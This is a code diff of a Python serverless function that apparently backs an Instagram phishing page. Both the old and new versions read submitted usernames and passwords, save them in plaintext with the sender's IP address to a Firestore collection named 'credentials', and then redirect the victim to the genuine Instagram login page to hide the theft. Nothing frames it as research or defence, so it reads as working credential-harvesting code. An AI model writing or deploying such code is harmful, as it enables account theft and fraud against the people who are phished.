@@ -1,26 +1,20 @@
-from http.server import BaseHTTPRequestHandler
-from urllib.parse import parse_qs
-from datetime import datetime
 import firebase_admin
-from firebase_admin import credentials, firestore
-import os
+from firebase_admin import credentials, firestore, initialize_app
 import json
+import os
+from datetime import datetime
 
-# Initialize Firebase once
+# Initialize Firebase
 if not firebase_admin._apps:
     cred = credentials.Certificate(json.loads(os.environ['FIREBASE_CONFIG']))
-    firebase_admin.initialize_app(cred)
+    initialize_app(cred)
 
 db = firestore.client()
 
-class handler(BaseHTTPRequestHandler):
-    def do_POST(self):
-        content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length).decode('utf-8')
-        form_data = parse_qs(post_data)
-        
-        username = form_data.get('username', [''])[0]
-        password = form_data.get('password', [''])[0]
+def handler(request):
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
         
         if username and password:
             doc_ref = db.collection('credentials').document()
@@ -28,9 +22,14 @@ class handler(BaseHTTPRequestHandler):
                 'username': username,
                 'password': password,
                 'timestamp': datetime.now().isoformat(),
-                'ip_address': self.headers.get('X-Forwarded-For', '')
+                'ip_address': request.headers.get('x-forwarded-for', '')
             })
         
-        self.send_response(302)
-        self.send_header('Location', 'https://www.instagram.com/accounts/login/')
-        self.end_headers()
+        return {
+            'statusCode': 302,
+            'headers': {
+                'Location': 'https://www.instagram.com/accounts/login/'
+            }
+        }
+    
+    return {'statusCode': 405}  # Method not allowed
